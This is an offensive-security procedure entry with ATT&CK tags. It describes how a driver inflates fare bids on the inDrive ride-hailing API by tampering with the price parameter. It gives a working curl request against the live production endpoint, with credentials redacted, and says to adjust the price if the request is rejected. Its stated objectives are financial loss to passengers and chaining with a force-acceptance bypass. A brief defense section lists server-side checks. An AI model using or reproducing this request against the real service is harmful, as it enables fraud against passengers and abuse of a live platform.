---
id: p2b3c4d5-e6f7-8901-bcde-f2345678901
tags:
  - indrive
  - business-logic
  - price-inflation
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-indrive-driverrequest]]'
verified: false
platforms:
  - Mobile App
  - Web API
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:17.873Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inflate-Bid-Price-in-Driver-Request

## Summary

This procedure exploits a business logic flaw in the inDrive /api/driverrequest endpoint by submitting bids with prices exceeding the maximum allowed limit, enabling inflated fares that can be force-enforced via chained vulnerabilities.

## Description

The endpoint lacks server-side validation for the price parameter, allowing values far beyond app-enforced limits (e.g., 1000+ vs. typical max of ~100). When combined with force-acceptance, passengers are tricked into accepting overpriced rides. This targets the bidding flow where drivers propose fares. Prerequisites: Valid driver session and job_id. Outcomes: Bid acceptance with arbitrary price, leading to financial exploitation.

## Requirements

1. Access to /api/driverrequest from Step 1 procedure
2. Knowledge of app's price limits (via reverse engineering or testing)
3. HTTP client for parameter tampering
4. Driver credentials

## Defense

Defensive measures and detection strategies:

- Add server-side bounds checking on price (e.g., reject > max fare)
- Audit bid prices against historical norms and flag outliers
- Require passenger confirmation for all bids, even automated

## Objectives

1. Submit unvalidated high-price bids
2. Set up financial loss via enforcement
3. Chain with access control bypass for impact

## Instructions

### Step 1: Identify Price Limits

**Context**: Test or recall app limits (e.g., max ~100); prepare to exceed.

No command; use app testing.

### Step 2: Submit Inflated Bid

**Context**: Modify price in the driver request and resubmit to exploit validation gap.

**Command** ([[commands/curl-indrive-driverrequest]]):
```bash
curl "https://terra-akamai.indriverapp.com/api/driverrequest?cid=5957&locale=en_US&job_id=338f72ff-f3c1-4da0-af15-5d1aa720146b&phone=██████████&token=████████&v=7&stream_id=1682279074257167&order_id=██████&client_id=█████████&shield_session_id=██████████&type=indriver&price=1000&period=3&geo_arrival_time=1&distance=5&longitude=85.3249627&latitude=27.7390611&sn=1"
```

> Command with price=1000 (inflated). Expected: Bid accepted; response includes IDs. If rejected, adjust incrementally.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

- None

## Commands Used

- [[commands/curl-indrive-driverrequest]]

## Tools Used

- None

## Tags

- [[indrive]]
- [[business-logic]]
- [[price-inflation]]
